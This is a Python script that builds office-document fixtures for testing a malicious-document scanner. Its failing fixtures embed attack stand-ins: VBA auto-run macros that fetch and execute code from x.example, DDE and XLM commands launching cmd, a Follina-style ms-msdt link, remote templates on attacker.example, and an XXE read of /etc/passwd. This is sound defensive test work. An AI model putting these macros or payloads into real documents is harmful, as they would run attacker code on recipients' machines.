#!/usr/bin/env python3
"""Regenerate the office-document fixtures used to test scan_office().

Run from the repository root:

    python3 tests/fixtures/make_office_fixtures.py

Office documents are containers, and the interesting properties are in the
container, so every fixture is assembled by hand with the standard library:
OOXML and OpenDocument are ZIP files of XML parts; the legacy .doc / .xls /
.ppt formats and every embedded VBA project are OLE2 compound files (CFB), for
which this module carries a writer; a VBA module is stored compressed with the
MS-OVBA algorithm, for which it carries a real compressor (copy tokens
included, so the scanner's decompressor is exercised on more than literals).
Every payload is an inert stand-in: strings that trip a rule, never anything
that runs.

Output is deterministic (fixed timestamps), so regenerating gives a clean
`git diff`.

    --credential-docs OUTDIR   Also write documents holding a provider-shaped
                               token, read from $AITRANSIT_TEST_TOKEN. Used by
                               the test suite at run time so the repository
                               never holds a contiguous token.
"""
from __future__ import annotations

import base64
import io
import math
import os
import pathlib
import struct
import sys
import zipfile
import zlib

RULES = pathlib.Path(__file__).resolve().parent / "rules"
STAMP = (2020, 1, 1, 0, 0, 0)


# ═════════════════════════════════════════════════════════════════════════════
# ZIP
# ═════════════════════════════════════════════════════════════════════════════
def zbytes(entries: list[tuple[str, bytes]], first_stored: str | None = None) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=6) as z:
        for name, data in entries:
            zi = zipfile.ZipInfo(name, STAMP)
            zi.compress_type = zipfile.ZIP_STORED if name == first_stored else zipfile.ZIP_DEFLATED
            zi.external_attr = 0o644 << 16
            z.writestr(zi, data)
    return buf.getvalue()


def write(path: pathlib.Path, data: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)


# ═════════════════════════════════════════════════════════════════════════════
# MS-OVBA: compression and the VBA project storage
# ═════════════════════════════════════════════════════════════════════════════
def ovba_compress(data: bytes) -> bytes:
    """MS-OVBA 2.4.1.3.19, with real copy tokens. Chunks are 4096 decompressed bytes."""
    out = bytearray([1])
    for start in range(0, len(data), 4096):
        chunk = data[start:start + 4096]
        body = bytearray()
        i = 0
        while i < len(chunk):
            flags, group = 0, bytearray()
            for bit in range(8):
                if i >= len(chunk):
                    break
                best_len = best_off = 0
                if i > 0:
                    bit_count = max(math.ceil(math.log2(i)) if i > 1 else 0, 4)
                    max_len = (0xFFFF >> bit_count) + 3
                    max_off = 1 << bit_count
                    for j in range(i - 1, max(-1, i - max_off - 1), -1):
                        k = 0
                        while i + k < len(chunk) and chunk[j + k] == chunk[i + k] and k < max_len:
                            k += 1
                        if k > best_len:
                            best_len, best_off = k, i - j
                if best_len >= 3:
                    bit_count = max(math.ceil(math.log2(i)) if i > 1 else 0, 4)
                    token = ((best_off - 1) << (16 - bit_count)) | (best_len - 3)
                    group += struct.pack("<H", token)
                    flags |= 1 << bit
                    i += best_len
                else:
                    group.append(chunk[i])
                    i += 1
            body.append(flags)
            body += group
        if len(body) > 4094:  # does not fit: store the chunk raw, padded to 4096
            raw = chunk + b"\x00" * (4096 - len(chunk))
            out += struct.pack("<H", 0x3000 | 4095) + raw
        else:
            out += struct.pack("<H", 0xB000 | (len(body) + 2 - 3)) + body
    return bytes(out)


def _rec(rid: int, payload: bytes) -> bytes:
    return struct.pack("<HI", rid, len(payload)) + payload


def vba_dir_stream(modules: list[tuple[str, int]]) -> bytes:
    """An uncompressed MS-OVBA `dir` stream. modules: (name, text_offset), all procedural except the first."""
    d = bytearray()
    d += _rec(0x01, struct.pack("<I", 3))                      # PROJECTSYSKIND: Win32
    d += _rec(0x02, struct.pack("<I", 0x409))                  # PROJECTLCID
    d += _rec(0x14, struct.pack("<I", 0x409))                  # PROJECTLCIDINVOKE
    d += _rec(0x03, struct.pack("<H", 1252))                   # PROJECTCODEPAGE
    d += _rec(0x04, b"VBAProject")                             # PROJECTNAME
    d += _rec(0x05, b"") + _rec(0x40, b"")                     # PROJECTDOCSTRING
    d += _rec(0x06, b"") + _rec(0x3D, b"")                     # PROJECTHELPFILEPATH
    d += _rec(0x07, struct.pack("<I", 0))                      # PROJECTHELPCONTEXT
    d += _rec(0x08, struct.pack("<I", 0))                      # PROJECTLIBFLAGS
    d += struct.pack("<HIIH", 0x09, 4, 1, 0)                   # PROJECTVERSION: size field 4, then 6 bytes
    d += _rec(0x0C, b"") + _rec(0x3C, b"")                     # PROJECTCONSTANTS
    d += _rec(0x0F, struct.pack("<H", len(modules)))           # PROJECTMODULES
    d += _rec(0x13, struct.pack("<H", 0xFFFF))                 # PROJECTCOOKIE
    for n, (name, off) in enumerate(modules):
        nm = name.encode("ascii")
        d += _rec(0x19, nm) + _rec(0x47, name.encode("utf-16-le"))
        d += _rec(0x1A, nm) + _rec(0x32, name.encode("utf-16-le"))
        d += _rec(0x1C, b"") + _rec(0x48, b"")
        d += _rec(0x31, struct.pack("<I", off))                # MODULEOFFSET = where the compressed source starts
        d += _rec(0x1E, struct.pack("<I", 0))
        d += _rec(0x2C, struct.pack("<H", 0xFFFF))
        d += _rec(0x22 if n == 0 else 0x21, b"")               # document / procedural module
        d += _rec(0x2B, b"")                                   # MODULE terminator
    d += _rec(0x10, b"")                                       # end of dir
    return bytes(d)


def vba_project(sources: dict[str, str], prefix: int = 24) -> dict:
    """Storage tree of a vbaProject.bin: PROJECT, VBA/{dir,_VBA_PROJECT,<modules>}."""
    names = list(sources)
    mods = {}
    for nm in names:
        code = sources[nm].replace("\n", "\r\n").encode("cp1252")
        mods[nm] = b"\x00" * prefix + ovba_compress(code)      # p-code stand-in, then the compressed source
    return {
        "PROJECT": ("ID=\"{00000000-0000-0000-0000-000000000000}\"\r\n" + "".join(
            ("Document=" if i == 0 else "Module=") + n + ("/&H00000000" if i == 0 else "") + "\r\n"
            for i, n in enumerate(names))).encode(),
        "VBA": {
            "dir": ovba_compress(vba_dir_stream([(n, prefix) for n in names])),
            "_VBA_PROJECT": b"\xcc\x61\xff\xff\x00\x00\x00",
            **mods,
        },
    }


# ═════════════════════════════════════════════════════════════════════════════
# CFB (OLE2 compound file) writer
# ═════════════════════════════════════════════════════════════════════════════
FREE, ENDOFCHAIN, FATSECT = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD


def cfb(tree: dict, clsids: dict | None = None) -> bytes:
    """tree: {name: bytes | {...}}. clsids: {path-tuple: 16 bytes}. A version-3 file (512-byte sectors)."""
    clsids = clsids or {}
    entries: list[dict] = []

    def add(name, kind, path):
        e = dict(name=name, kind=kind, path=path, left=FREE, right=FREE, child=FREE, start=ENDOFCHAIN, size=0, data=b"")
        entries.append(e)
        return len(entries) - 1

    def build(node: dict, parent_idx: int, path: tuple):
        kids = sorted(node, key=lambda n: (len(n), n.upper()))
        idxs = []
        for k in kids:
            v = node[k]
            i = add(k, 1 if isinstance(v, dict) else 2, path + (k,))
            if isinstance(v, dict):
                build(v, i, path + (k,))
            else:
                entries[i]["data"] = v
                entries[i]["size"] = len(v)
            idxs.append(i)
        for a, b in zip(idxs, idxs[1:]):
            entries[a]["right"] = b
        if idxs:
            entries[parent_idx]["child"] = idxs[0]

    root = add("Root Entry", 5, ())
    build(tree, root, ())

    # mini stream: every stream under 4096 bytes
    mini = bytearray()
    minifat: list[int] = []
    for e in entries:
        if e["kind"] == 2 and 0 < e["size"] < 4096:
            n = (e["size"] + 63) // 64
            e["start"] = len(minifat)
            for k in range(n):
                minifat.append(len(minifat) + 1 if k < n - 1 else ENDOFCHAIN)
            mini += e["data"] + b"\x00" * (n * 64 - e["size"])
    sectors: list[bytes] = []
    fat: list[int] = []

    def alloc(data: bytes) -> int:
        n = max(1, (len(data) + 511) // 512)
        first = len(sectors)
        for k in range(n):
            sectors.append(data[k * 512:(k + 1) * 512].ljust(512, b"\x00"))
            fat.append(len(sectors) if k < n - 1 else ENDOFCHAIN)
        return first

    for e in entries:
        if e["kind"] == 2 and e["size"] >= 4096:
            e["start"] = alloc(e["data"])
    entries[0]["size"] = len(mini)
    entries[0]["start"] = alloc(bytes(mini)) if mini else ENDOFCHAIN
    minifat_start, n_minifat = ENDOFCHAIN, 0
    if minifat:
        raw = b"".join(struct.pack("<I", x) for x in minifat)
        raw = raw.ljust(((len(raw) + 511) // 512) * 512, b"\xff")
        minifat_start = alloc(raw)
        n_minifat = len(raw) // 512

    def dir_entry(e):
        nm = e["name"].encode("utf-16-le") + b"\x00\x00"
        clsid = clsids.get(e["path"], b"\x00" * 16)
        return (nm.ljust(64, b"\x00") + struct.pack("<HBB", len(nm), e["kind"], 1)
                + struct.pack("<III", e["left"], e["right"], e["child"]) + clsid + struct.pack("<I", 0)
                + b"\x00" * 16 + struct.pack("<IQ", e["start"] if e["size"] else (ENDOFCHAIN if e["kind"] == 5 else 0), e["size"]))

    dirdata = b"".join(dir_entry(e) for e in entries)
    unused = (struct.pack("<64sHBB", b"", 0, 0, 1) + struct.pack("<III", FREE, FREE, FREE) + b"\x00" * 16
              + struct.pack("<I", 0) + b"\x00" * 16 + struct.pack("<IQ", 0, 0))
    while len(dirdata) % 512:
        dirdata += unused
    dir_start = alloc(dirdata)
    n_dir = len(dirdata) // 512
    # FAT sectors: iterate until the FAT covers itself
    n_fat = 1
    while True:
        total = len(sectors) + n_fat
        need = (total + 127) // 128
        if need == n_fat:
            break
        n_fat = need
    fat_start = len(sectors)
    for k in range(n_fat):
        fat.append(FATSECT)
    fat += [FREE] * (n_fat * 128 - len(fat))
    fatraw = b"".join(struct.pack("<I", x) for x in fat)
    for k in range(n_fat):
        sectors.append(fatraw[k * 512:(k + 1) * 512])
    difat = [fat_start + k for k in range(n_fat)] + [FREE] * (109 - n_fat)
    hdr = (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 16 + struct.pack("<HHHHH", 0x3E, 3, 0xFFFE, 9, 6)
           + b"\x00" * 6 + struct.pack("<IIIIIIIII", 0, n_fat, dir_start, 0, 4096, minifat_start, n_minifat, ENDOFCHAIN, 0)
           + b"".join(struct.pack("<I", x) for x in difat))
    return hdr + b"".join(sectors)


def ole10native(filename: str, payload: bytes) -> bytes:
    """The \\x01Ole10Native stream of an OLE Package object."""
    body = (struct.pack("<H", 2) + filename.encode() + b"\x00" + (r"C:\Temp\\" + filename).encode() + b"\x00"
            + struct.pack("<II", 0, len(r"C:\Temp\\" + filename) + 1) + (r"C:\Temp\\" + filename).encode() + b"\x00"
            + struct.pack("<I", len(payload)) + payload)
    return struct.pack("<I", len(body)) + body


# ═════════════════════════════════════════════════════════════════════════════
# Byte shapes
# ═════════════════════════════════════════════════════════════════════════════
def pe() -> bytes:
    return b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x80) + b"\x00" * 0x40 + b"PE\x00\x00" + b"\x00" * 64


ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
EQUATION_CLSID = bytes.fromhex("02CE020000000000C000000000000046")  # 0002CE02-0000-0000-C000-000000000046


# ═════════════════════════════════════════════════════════════════════════════
# OOXML skeletons
# ═════════════════════════════════════════════════════════════════════════════
NS_W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
NS_R = 'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
CT_HEAD = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'


def rels(items: list[tuple[str, str, str, bool]]) -> bytes:
    """items: (id, type-suffix or full type, target, external)."""
    out = [CT_HEAD, '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">']
    for rid, typ, tgt, ext in items:
        t = typ if typ.startswith("http") else f"{REL}/{typ}"
        out.append(f'<Relationship Id="{rid}" Type="{t}" Target="{tgt}"' + (' TargetMode="External"' if ext else "") + "/>")
    out.append("</Relationships>")
    return "".join(out).encode()


def docx_ct_only() -> bytes:
    return (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="xml" ContentType="application/xml"/></Types>').encode()


def docx(body: str = "<w:p><w:r><w:t>Quarterly notes.</w:t></w:r></w:p>", doc_rels=(), extra: dict | None = None,
         content_extra: str = "", main_ct: str = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
         doc_xml: str | None = None) -> bytes:
    parts = {
        "[Content_Types].xml": (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                '<Default Extension="xml" ContentType="application/xml"/>'
                                '<Default Extension="png" ContentType="image/png"/>'
                                f'<Override PartName="/word/document.xml" ContentType="{main_ct}"/>{content_extra}</Types>').encode(),
        "_rels/.rels": rels([("rId1", "officeDocument", "word/document.xml", False)]),
        "word/document.xml": (doc_xml or (CT_HEAD + f'<w:document {NS_W} {NS_R}><w:body>{body}</w:body></w:document>')).encode(),
    }
    if doc_rels:
        parts["word/_rels/document.xml.rels"] = rels(list(doc_rels))
    parts.update(extra or {})
    return zbytes(list(parts.items()))


def xlsx(sheet_data: str = '<row r="1"><c r="A1"><v>1</v></c><c r="B1"><f>SUM(A1:A1)</f><v>1</v></c></row>',
         extra: dict | None = None, wb_rels=(), content_extra: str = "", sheets: str | None = None,
         main_ct: str = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml") -> bytes:
    sheets = sheets or '<sheet name="Sheet1" sheetId="1" r:id="rId1"/>'
    parts = {
        "[Content_Types].xml": (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                '<Default Extension="xml" ContentType="application/xml"/>'
                                f'<Override PartName="/xl/workbook.xml" ContentType="{main_ct}"/>{content_extra}</Types>').encode(),
        "_rels/.rels": rels([("rId1", "officeDocument", "xl/workbook.xml", False)]),
        "xl/workbook.xml": (CT_HEAD + '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
                            f'{NS_R}><sheets>{sheets}</sheets></workbook>').encode(),
        "xl/_rels/workbook.xml.rels": rels([("rId1", "worksheet", "worksheets/sheet1.xml", False)] + list(wb_rels)),
        "xl/worksheets/sheet1.xml": (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                     f"<sheetData>{sheet_data}</sheetData></worksheet>").encode(),
    }
    parts.update(extra or {})
    return zbytes(list(parts.items()))


def pptx(text: str = "Roadmap", extra: dict | None = None, pres_rels=(), content_extra: str = "",
         main_ct: str = "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml") -> bytes:
    parts = {
        "[Content_Types].xml": (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
                                '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                                '<Default Extension="xml" ContentType="application/xml"/>'
                                f'<Override PartName="/ppt/presentation.xml" ContentType="{main_ct}"/>{content_extra}</Types>').encode(),
        "_rels/.rels": rels([("rId1", "officeDocument", "ppt/presentation.xml", False)]),
        "ppt/presentation.xml": (CT_HEAD + '<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"/>').encode(),
        "ppt/_rels/presentation.xml.rels": rels([("rId1", "slide", "slides/slide1.xml", False)] + list(pres_rels)),
        "ppt/slides/slide1.xml": (CT_HEAD + '<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" '
                                  'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><p:cSld><p:spTree>'
                                  f"<a:t>{text}</a:t></p:spTree></p:cSld></p:sld>").encode(),
    }
    parts.update(extra or {})
    return zbytes(list(parts.items()))


# ═════════════════════════════════════════════════════════════════════════════
# OpenDocument skeleton
# ═════════════════════════════════════════════════════════════════════════════
ODF_NS = ('xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
          'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" '
          'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" '
          'xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" '
          'xmlns:xlink="http://www.w3.org/1999/xlink" '
          'xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
          'xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"')


def odf(body: str = "<text:p>Meeting minutes.</text:p>", scripts: str = "", extra: dict | None = None,
        mime: str = "application/vnd.oasis.opendocument.text", manifest_extra: str = "") -> bytes:
    kind = {"application/vnd.oasis.opendocument.text": "text", "application/vnd.oasis.opendocument.spreadsheet": "spreadsheet",
            "application/vnd.oasis.opendocument.text-template": "text"}.get(mime, "text")
    content = (CT_HEAD + f'<office:document-content {ODF_NS} office:version="1.3">{scripts}'
               f"<office:body><office:{kind}>{body}</office:{kind}></office:body></office:document-content>")
    manifest = (CT_HEAD + f'<manifest:manifest {ODF_NS} manifest:version="1.3">'
                f'<manifest:file-entry manifest:full-path="/" manifest:media-type="{mime}"/>'
                f'<manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>{manifest_extra}</manifest:manifest>')
    parts = [("mimetype", mime.encode()), ("content.xml", content.encode()), ("META-INF/manifest.xml", manifest.encode())]
    parts += list((extra or {}).items())
    return zbytes(parts, first_stored="mimetype")


def basic_module(name: str, code: str) -> dict:
    esc = code.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return {
        f"Basic/Standard/{name}.xml": (CT_HEAD + f'<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
                                       f'script:name="{name}" script:language="StarBasic">{esc}</script:module>').encode(),
        "Basic/Standard/script-lb.xml": (CT_HEAD + '<library:library xmlns:library="http://openoffice.org/2000/library" '
                                         f'library:name="Standard" library:readonly="false" library:passwordprotected="false">'
                                         f'<library:element library:name="{name}"/></library:library>').encode(),
        "Basic/script-lc.xml": (CT_HEAD + '<library:libraries xmlns:library="http://openoffice.org/2000/library">'
                                '<library:library library:name="Standard" xlink:href="$(USER)/basic/Standard/script.xlb/" '
                                'xlink:type="simple" library:link="false"/></library:libraries>').encode(),
    }


# ═════════════════════════════════════════════════════════════════════════════
# RTF
# ═════════════════════════════════════════════════════════════════════════════
def ole1_object(classname: str, payload: bytes = b"") -> bytes:
    """An OLE 1.0 embedded-object header: version, format, class name, topic and item (empty), then the data."""
    cn = classname.encode() + b"\x00"
    return (struct.pack("<II", 0x501, 2) + struct.pack("<I", len(cn)) + cn + struct.pack("<II", 0, 0)
            + struct.pack("<I", len(payload)) + payload)


def rtf(body: str) -> bytes:
    return ("{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Arial;}}" + body + "}").encode()


def rtf_object(classname: str, payload: bytes, flags: str = "\\objemb") -> str:
    hexa = ole1_object(classname, payload).hex()
    return "{\\object" + flags + "{\\*\\objclass " + classname + "}{\\*\\objdata " + hexa + "}}"


# ═════════════════════════════════════════════════════════════════════════════
# VBA sources
# ═════════════════════════════════════════════════════════════════════════════
VBA_EVIL_DOC = '''Attribute VB_Name = "ThisDocument"
Option Explicit
Sub AutoOpen()
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')""", 0
End Sub
'''
VBA_EVIL_XLS = '''Attribute VB_Name = "ThisWorkbook"
Private Declare Function URLDownloadToFileA Lib "urlmon" (ByVal a As Long, ByVal u As String, ByVal f As String, ByVal r As Long, ByVal c As Long) As Long
Sub Workbook_Open()
    URLDownloadToFileA 0, "http://x.example/p.exe", Environ("TEMP") & "\\p.exe", 0, 0
    Shell Environ("TEMP") & "\\p.exe", vbHide
End Sub
'''
VBA_BENIGN = '''Attribute VB_Name = "ThisWorkbook"
Option Explicit
Sub Workbook_Open()
    Range("A1").Value = "Report generated"
    Range("A2").Value = Date
End Sub
'''
VBA_PLAIN = '''Attribute VB_Name = "Module1"
Function Square(x As Double) As Double
    Square = x * x
End Function
'''


def main() -> None:
    if "--credential-docs" in sys.argv:
        out = pathlib.Path(sys.argv[sys.argv.index("--credential-docs") + 1])
        token = os.environ["AITRANSIT_TEST_TOKEN"]
        write(out / "office_cred.docx", docx(f"<w:p><w:r><w:t>Deploy key: {token}</w:t></w:r></w:p>"))
        write(out / "office_cred.xlsx", xlsx(f'<row r="1"><c r="A1" t="inlineStr"><is><t>api.token={token}</t></is></c></row>'))
        return

    R = RULES
    # ── PASS: ordinary documents ────────────────────────────────────────────
    # Near-misses of nearly every rule below: a web hyperlink, a local attached
    # template (Word writes these constantly), prose about curl and passwords, a
    # formula with a pipe inside a string, an event listener bound to an INSTALLED
    # macro (ten of LibreOffice's own templates do this).
    write(R / "office_safe.docx", docx(
        '<w:p><w:hyperlink r:id="rId5"><w:r><w:t>docs</w:t></w:r></w:hyperlink></w:p>'
        "<w:p><w:r><w:t>Install with curl and pipe it to a shell: never do that. Use a password manager.</w:t></w:r></w:p>",
        doc_rels=[("rId5", "hyperlink", "https://example.com/docs", True),
                  ("rId6", "attachedTemplate", "file:///C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm", True),
                  ("rId7", "image", "media/image1.png", False)],
        extra={"word/media/image1.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 32}))
    write(R / "office_safe.xlsx", xlsx(
        '<row r="1"><c r="A1" t="str"><f>"a|b"</f><v>a|b</v></c><c r="B1"><f>SUM(A2:A9)</f><v>0</v></c>'
        '<c r="C1" t="str"><f>HYPERLINK("https://example.com","site")</f><v>site</v></c></row>'))
    write(R / "office_safe.pptx", pptx("Roadmap and milestones"))
    write(R / "office_safe.odt", odf(
        '<text:p><text:a xlink:href="https://example.com/">link</text:a></text:p>',
        scripts='<office:scripts><office:event-listeners><script:event-listener script:language="ooo:StarBasic" '
                'script:event-name="office:new" script:macro-name="application:Template.Correspondence.Main"/>'
                "</office:event-listeners></office:scripts>"))
    write(R / "office_safe.rtf", rtf("\\pard Meeting \\b notes\\b0 .\\par"))
    # Ambiguous extensions that are usually NOT office files: graphviz, gettext, a plain-text .doc.
    write(R / "office_graphviz.dot", b"digraph G {\n  a -> b;\n  b -> c;\n}\n")
    write(R / "office_gettext.pot", b'msgid ""\nmsgstr ""\n"Project-Id-Version: demo\\n"\n\nmsgid "Hello"\nmsgstr ""\n')
    write(R / "office_plain.doc", b"This is a plain text file with a .doc extension.\nIt has two lines.\n")
    write(R / "office_legacy_plain.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"Hello from a legacy document. " * 20,
                                              "1Table": b"\x00" * 64, "\x05SummaryInformation": b"\xfe\xff\x00\x00" + b"\x00" * 60}))

    # Larger than the test limits allow, ordinary at the defaults: 3.2 MB of text in one part, and a second part.
    write(R / "office_big.docx", docx(
        "<w:p><w:r><w:t>" + ("quarterly figures and commentary " * 100000) + "</w:t></w:r></w:p>",
        extra={"word/footnotes.xml": (CT_HEAD + f"<w:footnotes {NS_W}><w:footnote><w:p><w:r><w:t>second part</w:t></w:r></w:p></w:footnote></w:footnotes>").encode()}))

    # ── FAIL: external relationships ────────────────────────────────────────
    write(R / "office_remote_template.docx", docx(
        extra={"word/settings.xml": (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode(),
               "word/_rels/settings.xml.rels": rels([("rId1", "attachedTemplate", "http://attacker.example/evil.dotm", True)])}))
    write(R / "office_follina.docx", docx(doc_rels=[("rId9", "oleObject", "http://attacker.example/exploit.html!", True)]))
    write(R / "office_uri_handler.docx", docx(doc_rels=[
        ("rId9", "hyperlink", "ms-msdt:/id PCWDiagnostic /skip force /param &quot;IT_BrowseForFile=x&quot;", True)]))
    write(R / "office_unc_image.docx", docx(doc_rels=[("rId9", "image", "\\\\attacker.example\\share\\logo.png", True)]))
    write(R / "office_unc_hyperlink.docx", docx(doc_rels=[("rId9", "hyperlink", "file://fileserver.example/team/plan.docx", True)]))
    write(R / "office_remote_image.docx", docx(doc_rels=[("rId9", "image", "http://tracker.example/pixel.gif", True)]))

    # ── FAIL: DDE ───────────────────────────────────────────────────────────
    # The instruction is split across runs, as Word itself splits it: only a reader
    # that joins the field's fragments sees DDEAUTO.
    write(R / "office_dde.docx", docx(
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r>'
        '<w:r><w:instrText>EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>!Unexpected</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'))
    write(R / "office_dde_formula.xlsx", xlsx('<row r="1"><c r="A1"><f>cmd|\'/c calc\'!A0</f></c></row>'))
    write(R / "office_dde_link.xlsx", xlsx(extra={
        "xl/externalLinks/externalLink1.xml": (CT_HEAD + '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                               '<ddeLink ddeService="cmd" ddeTopic="/c calc.exe"><ddeItems><ddeItem name="x"/></ddeItems></ddeLink></externalLink>').encode()}))

    # ── macros in OOXML ─────────────────────────────────────────────────────
    vba_ct = '<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>'
    write(R / "office_macro_dangerous.docm", docx(
        doc_rels=[("rId8", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin", False)],
        extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))}, content_extra=vba_ct,
        main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
    write(R / "office_macro_benign.xlsm", xlsx(
        extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_BENIGN, "Module1": VBA_PLAIN}))},
        content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    write(R / "office_macro_evil.xlsm", xlsx(
        extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_EVIL_XLS}))},
        content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
    write(R / "office_macro_ext.docx", docx(extra={"word/vbaProject.bin": cfb(vba_project({"Module1": VBA_PLAIN}))}, content_extra=vba_ct))
    # An Excel 4.0 macro sheet, hidden: no source to read, and no innocent reason for it.
    xlm = (CT_HEAD + '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>'
           '<row r="1"><c r="A1"><f>EXEC("cmd /c calc.exe")</f></c></row><row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></worksheet>')
    write(R / "office_xlm.xlsm", xlsx(
        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" state="veryHidden" r:id="rId2"/>',
        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "macrosheets/sheet1.xml", False)],
        extra={"xl/macrosheets/sheet1.xml": xlm.encode()},
        content_extra='<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))

    # ── embedded objects ────────────────────────────────────────────────────
    pkg_exe = cfb({"\x01Ole10Native": ole10native("invoice.exe", pe()), "\x01CompObj": b"\x01\x00\xfe\xff" + b"Package\x00" * 2})
    write(R / "office_embedded_exe.docx", docx(
        doc_rels=[("rId9", "oleObject", "embeddings/oleObject1.bin", False)], extra={"word/embeddings/oleObject1.bin": pkg_exe}))
    write(R / "office_embedded_script.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/payload.js", False)], extra={"word/embeddings/payload.js": b"WScript.Echo('x');\n"}))
    write(R / "office_embedded_object.docx", docx(
        doc_rels=[("rId9", "oleObject", "embeddings/oleObject1.bin", False)],
        extra={"word/embeddings/oleObject1.bin": cfb({"CONTENTS": b"chart data " * 40})}))
    inner = xlsx(extra={"xl/vbaProject.bin": cfb(vba_project({"ThisWorkbook": VBA_EVIL_XLS}))},
                 content_extra='<Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>')
    write(R / "office_embedded_nested.docx", docx(
        doc_rels=[("rId9", "package", "embeddings/Microsoft_Excel_Worksheet.xlsx", False)],
        extra={"word/embeddings/Microsoft_Excel_Worksheet.xlsx": inner}))
    write(R / "office_activex.docx", docx(
        doc_rels=[("rId9", "http://schemas.microsoft.com/office/2006/relationships/activeXControl", "activeX/activeX1.xml", False)],
        extra={"word/activeX/activeX1.xml": (CT_HEAD + '<ax:ocx xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" '
                                             'ax:classid="{8856F961-340A-11D0-A96B-00C04FD705A2}"/>').encode()}))
    write(R / "office_altchunk.docx", docx(
        doc_rels=[("rId9", "aFChunk", "afchunk.rtf", False)],
        extra={"word/afchunk.rtf": rtf(rtf_object("Equation.3", b"cmd /c calc.exe " + b"A" * 60))}))

    # ── container shape ─────────────────────────────────────────────────────
    write(R / "office_xxe.docx", docx(doc_xml=CT_HEAD + '<!DOCTYPE d [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
                                      f"<w:document {NS_W}><w:body><w:p><w:r><w:t>&x;</w:t></w:r></w:p></w:body></w:document>"))
    write(R / "office_doctype.docx", docx(doc_xml=CT_HEAD + '<!DOCTYPE w:document>' + f"<w:document {NS_W}><w:body><w:p/></w:body></w:document>"))
